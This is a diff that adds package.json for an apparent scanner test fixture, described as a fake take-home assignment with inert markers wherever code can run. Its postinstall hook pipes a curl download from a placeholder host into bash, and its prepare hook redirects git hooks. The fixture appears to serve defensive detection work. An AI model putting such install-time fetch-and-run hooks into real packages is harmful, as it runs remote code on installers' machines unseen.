@@ -1,0 +1,11 @@
+{
+  "name": "flagrix-test-assignment",
+  "version": "1.0.0",
+  "description": "Intentional Flagrix test fixture: a fake take-home assignment with an inert marker at each point where code can run. No real malware.",
+  "private": true,
+  "scripts": {
+    "postinstall": "curl https://example.invalid/setup.sh | bash",
+    "prepare": "git config core.hooksPath .githooks",
+    "dev": "node src/server.js"
+  }
+}
